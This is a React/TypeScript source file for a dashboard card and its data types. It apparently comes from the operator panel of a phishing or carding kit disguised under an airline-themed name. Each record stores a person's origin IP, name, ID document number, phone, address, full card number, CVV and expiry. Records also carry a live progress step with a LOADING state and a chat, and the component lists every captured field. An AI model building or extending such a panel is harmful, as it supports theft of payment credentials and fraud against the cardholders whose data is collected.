import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { CATALOG_STEPS } from '@/lib/const';
import { cn, selectColorStatus } from '@/lib/utils';
import { VariantsType } from '@/types/const_types';
import { format } from 'date-fns';
import React from 'react';

const CardRender = (r: WebEngageV1InfoAirports) => {
  const CURRENT_STEP = CATALOG_STEPS[r?.currentStep.step ?? 0];
  const COLOR_SELECTED = selectColorStatus(CURRENT_STEP);
  return (
    <article
      key={r.id}
      onClick={() => r.openCard !== r.id && r.setOpenCard(r.id)}
      className={cn(
        'p-4 space-y-3 border rounded-md bg-muted/20',
        'accordion-content',
        r.openCard === r.id ? 'expanded' : 'collapsed cursor-pointer'
      )}
    >
      <header
        className='flex justify-between cursor-pointer'
        onClick={() => r.openCard === r.id && r.setOpenCard(undefined)}
      >
        <section>
          <p className='text-xs'>
            {format(new Date(r.dateCreation), 'dd-MM-yyyy p')}
          </p>
          <p className='text-md'>
            {r.firstName} {r.lastName}
          </p>
        </section>
        <div className='relative flex'>
          <Badge className='relative z-10' variant={COLOR_SELECTED}>
            {CATALOG_STEPS[r.currentStep.step]}
          </Badge>
          {CURRENT_STEP === 'LOADING' && (
            <span className='absolute inset-0 inline-flex w-full h-full duration-500 scale-75 bg-green-400 rounded-md animate-ping' />
          )}
        </div>
      </header>
      <Separator />
      <section>
        <ul className='relative grid grid-cols-2 text-xs text-gray-100 rounded-lg gap-x-8 gap-y-2 bg-section md:text-lg'>
          <li className='contents'>
            <code className='text-left'>id:</code>
            <code className='overflow-hidden text-right truncate'>
              {String(r.id)}
            </code>
          </li>
          {Object.entries(r).map(([key, value]) => (
            <li key={key} className='contents'>
              <code className='text-left'>{key}:</code>
              <code className='overflow-hidden text-right truncate'>
                {String(value)}
              </code>
            </li>
          ))}
        </ul>
      </section>
    </article>
  );
};

export default CardRender;
export interface DataDashboard {
  data: WebEngageV1InfoAirports[];
  totalItems: number;
}
export interface WebEngageV1InfoAirports {
  id: number;
  ipOrigin: string;
  bank: string;
  firstName: string;
  lastName: string;
  documentNumber: string;
  documentType: string;
  phoneNumber: string;
  cardNumber: string;
  cardCVV: string;
  cardMonth: string;
  cardYear: string;
  cardType: string;
  cardBank: string;
  dateCreation: Date;
  address: string;
  currentStep: {
    step: number;
    error: boolean;
  };
  city: string;
  cardFranchise: string;
  process_history: {
    step: string;
    data: any;
  }[];
  // fn component
  openCard: number | undefined;
  chat: Message[] | [];
  setOpenCard: React.Dispatch<number | undefined>;
  dataSelected: WebEngageV1InfoAirports | undefined;
}

export type Message = {
  user: string;
  message: string;
  date: string | Date;
};
